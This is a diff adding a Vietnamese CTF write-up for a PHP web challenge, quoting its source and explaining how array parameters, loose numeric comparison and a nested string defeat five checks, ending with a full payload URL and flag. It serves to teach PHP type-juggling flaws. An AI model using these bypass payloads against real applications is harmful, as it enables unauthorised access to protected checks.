@@ -1,4 +1,6 @@
 
+Phùng Văn Tài - AT17A - MSV: AT170143
+
 [PROG/MISC](#prog-misc)
 [CRYPTO](#crypto)
 [PWN](#pwn)
@@ -280,6 +282,119 @@ kiểm tra phía server ta nhận được flag:
 
 flag: Flag=KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}
 
+
+
+
+# Phpri Phprai
+WED
+
+## Description:
+> http://47.254.251.2:8889
+
+## Solution:
+sau khi truy cập đường dẫn được cung cấp thì mình có được mã nguồn sau:
+```php
+<?php
+    include 'config.php';
+    show_source("index.php");
+    error_reporting(0);
+    if(isset($_GET["1"]) && isset($_GET["2"])) {
+        $str1 = $_GET["1"];
+        $str2 = $_GET["2"];
+        if(($str1 !== $str2) && (md5($str1) == md5($str2))) {
+            echo $flag1;
+        }
+    }
+    if(isset($_GET["3"])) {
+        if( strcmp( $_GET['3'], $$flag ) == 0) {
+            echo $flag2;
+        }
+    }
+    if(isset($_GET["4"])) {
+        $str4 = $_GET["4"];
+        $str4=trim($str4);
+        if($str4 == '1.4e5' && $str4 !== '1.4e5') {
+            echo $flag3;
+        }
+    }
+    if(isset($_GET["5"])) {
+        $str5 = $_GET["5"];
+        if($str5 == 69 && $str5 !== '69' && $str5 !== 69 && strlen(trim($str5)) == 2) {
+            echo $flag4;
+        }
+    }
+    if(isset($_GET["6"])) {
+        $str6 = $_GET["6"];
+        $var1 = 'KaCeEtCe';
+        $var2 = preg_replace("/$var1/", '', $str6);
+        if($var1 === $var2) {
+            echo $flag5;
+        }
+    }
+?>
+```
+
+bài này khá đơn giản chỉ cần bypass qua các vòng if ở trên là lấy được từng phần của flag.
+```php
+if(isset($_GET["1"]) && isset($_GET["2"])) {
+        $str1 = $_GET["1"];
+        $str2 = $_GET["2"];
+        if(($str1 !== $str2) && (md5($str1) == md5($str2))) {
+            echo $flag1;
+        }
+    }
+```
+phần đầu tiên: cần truyền vào hai chuỗi str1, str2 khác nhau nhưng lại có md5 giống nhau, điều này khá kỳ lạ nhưng mình nghĩ nếu có thể làm cho md5 đều tạo thành null thì có thể thoả mã yêu cầu này. vì vậy mình truyền vào đây hai giá trị mảng.
+> ?1[]=a&2[]=b
+
+```php
+if(isset($_GET["3"])) {
+        if( strcmp( $_GET['3'], $$flag ) == 0) {
+            echo $flag2;
+        }
+    }
+```
+phần thứ hai: ở đây thì cần làm cho hàm strcmp trả về 0, mình đã thử áp dụng tiếp cách dùng mảng như trên để tạo ra null thì nó lại thành công, khi so sánh null == 0 
+
+```php
+if(isset($_GET["4"])) {
+        $str4 = $_GET["4"];
+        $str4=trim($str4);
+        if($str4 == '1.4e5' && $str4 !== '1.4e5') {
+            echo $flag3;
+        }
+    }
+```
+phần thứ ba: ở đây để ý thì thấy hàm trim sẽ bỏ hết khoảng trắng nhập vào. phân tích một chút thì toán tử == thì toán tử so sánh theo giá trị, còn !== là phải cùng giá trị và kiểu dữ liệu nữa. vì vậy cách giải quyết của mình là: đổi 1.4e5 = 140000. khi đó với == thì về giá trị 140000 = 1.4e5 còn kiểu dữ liệu thì nó khác nhau một cái là số , một cái là chuỗi.
+
+```php
+
+    if(isset($_GET["5"])) {
+        $str5 = $_GET["5"];
+        if($str5 == 69 && $str5 !== '69' && $str5 !== 69 && strlen(trim($str5)) == 2) {
+            echo $flag4;
+        }
+    }
+
+```
+phần thứ tư: phần này không khó, khá tương tự phần thứ 3, ý tưởng mình chỉ cần thêm một khoảng trắng ở trước 69 và truyền vào là được. " 69" chuyển sang số sẽ = "69", và " 69" chắc chắn khác về kiểu dữ liệu với "69" ....   sau đó đổi một chút, dùng urlencode để có thể truyền được khoảng trắng trên url: %2069
+
+```php
+    if(isset($_GET["6"])) {
+        $str6 = $_GET["6"];
+        $var1 = 'KaCeEtCe';
+        $var2 = preg_replace("/$var1/", '', $str6);
+        if($var1 === $var2) {
+            echo $flag5;
+        }
+    }
+```
+
+phần thứ 5: ở đây sử dụng hàm preg_replace() để thay đổi chuỗi KaCeEtCe nhưng bắt buộc phải nhập được chuỗi này thì mới in ra được flag vì vậy, mình nghĩ chỉ cần bỏ KaCeEtCe vào giữ chuỗi nhập vào như này: KaCeKaCeEtCeEtCe => như vậy dù có bị thay thế thành rỗng thì chuỗi vẫn cứ là KaCeEtCe ban đầu.
+
+payload cuối cùng: http://47.254.251.2:8889/?1[]=a&2[]=b&3[]=c&4=140000&5=%2069&6=KaCeKaCeEtCeEtCe
+
+flag: KCSC{B0_u_Bu_S4C_8usssssss_https://www.youtube.com/watch?v=xQtC3F8fH6g}
 
 
 
